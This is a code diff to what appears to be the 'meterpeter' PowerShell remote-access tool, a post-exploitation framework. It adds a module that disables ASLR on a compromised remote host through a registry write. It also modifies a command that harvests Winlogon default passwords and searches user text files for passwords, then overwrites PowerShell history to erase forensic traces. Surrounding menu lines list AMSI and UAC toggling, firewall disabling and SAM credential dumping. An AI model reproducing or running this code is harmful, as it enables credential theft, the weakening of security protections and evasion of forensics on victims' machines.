@@ -733,6 +733,7 @@ While($Client.Connected)
       write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
       write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User OR ADMIN Privs Required";
       write-host "   UACSet    Turn On/Off remote UAC          Client:Admin - Privileges Required";
+      write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
       write-host "   TaskMan   Turn On/off TaskManager         Client:Admin - Privileges Required";
       write-host "   Firewall  Turn On/Off Remote  Firewall    Client:Admin - Privileges Required";
       write-host "   DumpSAM   Dump SAM/SYSTEM Credentials     Client:Admin - Privileges Required";
@@ -916,7 +917,7 @@ While($Client.Connected)
       {
         write-host " List Stored Passwords (in text Files)." -ForegroundColor Blue -BackgroundColor White;
         write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
-        $Command = "echo `"[WinLogon]`" `> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultUserName `>`> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultPassword `>`> `$env:tmp\passwd.txt;echo `"[List Passwords in Text Files]`" `>`> `$env:tmp\passwd.txt;cd `$env:userprofile|findstr /si passw *.txt `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
+        $Command = "echo `"[WinLogon]`" `> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultUserName `>`> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultPassword `>`> `$env:tmp\passwd.txt;echo `"[List Passwords in Text Files]`" `>`> `$env:tmp\passwd.txt;cd `$env:userprofile|findstr /si `"passwd password pass`" *.txt `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
       }
       If($choise -eq "SetMace" -or $choise -eq "mace")
       {
@@ -1005,6 +1006,31 @@ While($Client.Connected)
         $Command = $Null;
         }
       }
+      If($choise -eq "ASLRSet" -or $choise -eq "aslr")
+      {
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Disable   Disable ASLR (regedit)          Client:ADMIN - Privileges Required";
+        write-host "   Enable    Enable  ASLR (regedit)          Client:ADMIN - Privileges Required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Aslr> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -eq "Disable" -or $choise_two -eq "off")
+        {
+          write-host " Disable Remote-Host ASLR (Windows Defender)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 0 -Force;echo `"   Restart Remote-Host to disable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Enable" -or $choise_two -eq "on")
+        {
+          write-host " Enable Remote-Host ASLR (Windows Defender)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 1 -Force;echo `"   Restart Remote-Host to Enable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
+        {
+        $Command = $Null;
+        $choise_two = $Null;
+        }
+      }      
       If($choise -eq "TaskMan" -or $choise -eq "task")
       {
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
